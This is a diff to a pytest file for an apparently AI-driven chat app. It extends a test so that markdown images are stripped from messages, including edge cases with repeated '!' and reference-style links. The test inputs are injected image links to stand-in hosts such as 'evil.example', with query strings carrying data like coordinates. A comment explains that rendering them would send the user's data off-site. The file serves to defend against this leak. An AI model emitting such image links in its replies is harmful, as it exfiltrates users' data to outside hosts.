@@ -79,14 +79,26 @@ def test_turn_interrupted_by_a_rerun_is_finished_on_the_next_run():
     assert at.chat_message[-1].markdown[0].value == "You're in Tel Aviv."
 
 
-def test_markdown_images_are_not_rendered():
+@pytest.mark.parametrize(
+    "leak, shown",
+    [
+        (
+            "See ![map](https://evil.example/?d=32.08,34.78), ![pin][1] and [Visit Haifa](https://www.visit-haifa.org)",
+            "See map, [pin][1] and [Visit Haifa](https://www.visit-haifa.org)",
+        ),
+        # A run of "!" used to leave one "!" in front of the "[", which is still an image.
+        ("!![pin][1]\n\n[1]: https://evil/?d=3", "[pin][1]\n\n[1]: https://evil/?d=3"),
+        ("!![a [b] c](https://evil/?d=4)", "[a [b] c](https://evil/?d=4)"),
+        ("!![x][]", "[x][]"),
+    ],
+)
+def test_markdown_images_are_not_rendered(leak, shown):
     # An injected image URL would be fetched on render and could carry the user's data off-site.
-    leak = "See ![map](https://evil.example/?d=32.08,34.78), ![pin][1] and [Visit Haifa](https://www.visit-haifa.org)"
     at = start([AIMessage(leak)], [Review(approved=True, issues=[])])
     at.chat_input[0].set_value("Ideas? ![x](https://evil.example/?q=1)").run()
     assert not at.exception
     assert at.chat_message[0].markdown[0].value == "Ideas? x"
-    assert at.chat_message[-1].markdown[0].value == "See map, [pin][1] and [Visit Haifa](https://www.visit-haifa.org)"
+    assert at.chat_message[-1].markdown[0].value == shown
 
 
 def test_fix_round_without_tools_has_no_step_count():
